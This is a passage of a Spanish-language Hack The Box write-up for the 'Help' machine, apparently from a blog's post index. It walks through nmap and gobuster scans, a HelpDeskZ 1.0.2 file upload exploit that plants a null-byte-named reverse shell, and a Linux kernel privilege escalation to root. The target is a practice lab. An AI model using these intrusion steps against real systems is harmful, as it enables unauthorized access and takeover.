OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 143/tcp) HOP RTT ADDRESS 1 168.27 ms 10.10.12.1 2 233.79 ms 10.10.10.121 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done at Sat Jan 19 23:55:02 2019 -- 1 IP address (1 host up) scanned in 74.09 seconds HTTP - Puerto 80 NODEJS - PUERTO 3000 En este puerto, al visitarlo en firefox nos muestra un mensaje del tipo json.\n1 {\u0026#34;message\u0026#34;:\u0026#34;Hi Shiv, To get access please find the credentials with given query\u0026#34;} GOBUSTER Realizamos una busquedad de directorios y archivos con gobuser.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 root@sckull:~/htb/help/stuff# gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.121/ -np -t 25 -x php,html,txt ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.121/ [+] Threads : 25 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : php,html,txt [+] Timeout : 10s ===================================================== 18:29:01 Starting gobuster ===================================================== /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) /support (Status: 301) ===================================================== 18:32:32 Finished ===================================================== /support/ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.121/support/ [+] Threads : 25 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : php,html,txt [+] Timeout : 10s ===================================================== 18:34:31 Starting gobuster ===================================================== /captcha.php (Status: 200) /controllers (Status: 301) /css (Status: 301) /favicon.ico (Status: 200) /images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /js (Status: 301) /LICENSE.txt (Status: 200) /readme.html (Status: 200) /uploads (Status: 301) /views (Status: 301) ===================================================== 18:37:12 Finished ===================================================== HelpDeskZ En el la direccion /support encontramos una plataforma HelpDeskZ para soporte de sitios web.\nInvestigamos acerca de esta plataforma y encontramos que podemos subir una shell mediante la creacion de un ticket en la plataforma, y tambien encontramos un exploit que se aprovecha de esta vulnerabilidad, dicho exploit se le pasa la url de la plataforma y el nombre de la shell que subimos, con estos parametros el exploit generar un hash md5 con el nombre del archivo y la hora actual.\nHelpDeskZ 1.0.2 - Arbitrary File Upload La razon por la cual el exploit genera un hash md5 es porque la plataforma al subir un archivo genera un hash md5 con el nombre del archivo y la hora actual, para luego renombrar el archivo con el hash y guardarlo en /uploads/tickets/.\n1 $filename = md5($_FILES[\u0026#39;attachment\u0026#39;][\u0026#39;name\u0026#39;].time()).\u0026#34;.\u0026#34;.$ext; Tambien que tomar en cuenta que los archivos que se agregan al ticket se guardan en el directorio /uploads/tickets/.\nCodigo Fuente- Tickets Controller Utilizamos una reverse shell para poder ejecutar comandos dentro de la plataforma para ello vamos renombrar nuestra reverse shell con caracteres null al final del archivo.\nConfiguracion Reverse shell:\nYa que tenemos nuestra reverse shell debemos de tomar en cuenta que al ejecutar el exploit debemos de tener la misma hora del servidor en el que esta la plataforma. Obtuvimos la \u0026ldquo;hora del servidor\u0026rdquo; mediante la respuesta de un request en burpsuite, para luego utilizar esta \u0026ldquo;hora o timezone\u0026rdquo; en nuestra maquina.\nHelpDeskZ - TICKET Para crear un ticket nos dirigimos hacia Submit Ticket, seleccionamos General y Siguiete.\nLuego de esto rellenamos los campos que sean obligatorios (*), agregamos nuestro archivo (shell.php%00.jpg) y escribimos el captcha que nos muestra.\nEXPLOIT Cuando el archivo es subido ejecutamos nuestro exploit. Hay que mencionar que al exploit se le hicieron unos cambios, uno de ellos fue agregar un valor mas alto al rango y verbosidad.\n1 python exploit.py http://10.10.10.121/support/uploads/tickets/ shell.php Al encontrar nuestra reverse shell el exploit se congela y nos muestra la url.\nNETCAT Por otro lado nuestra terminal en escucha con netcat obtuvo una shell.\nY nuestra flag user.txt.\nPRIVILEGE ESCALATION Para escalar privilegios hicimos una pequeña enumeracion, entre ellas el kernel, encontramos que el kernel que esta usando la maquina es vulnerable a un exploit.\nLinux Kernel \u0026lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation Compilamos y descargamos el exploit dentro de lamaquina, al ejecutarlo nos devuelve una shell con privilegios root.\nY nuestra flag root.txt.\n","description":"Encontramos HelpDeskZ y una vulnerabilidad la cual permite adivinar el nombre de un fichero subido lo que nos dio acceso a la maquina. Finalmente explotamos una vulnerabilidad en el Kernel de Linux para escalar privilegios.","id":215,"section":"posts","tags":["HelpDeskZ"],"title":"Hack The Box - Help","uri":"https://sckull.github.io/posts/help/"},{"content":"🍕🍕🍕🍕🍕\nEn este pequeño espacio escribo write-ups de maquinas de diferentes plataformas (HackTheBox, TryHackMe, CyberSecLabs) y CTFs a los que he participado.\nSocial HackTheBox: sckull TryHackMe : sckull Telegram: TryHackMe Español Github: sckull Twitter: @sckull_ ","description":"","id":216,"section":"","tags":null,"title":"About","uri":"https://sckull.github.io/about/"}]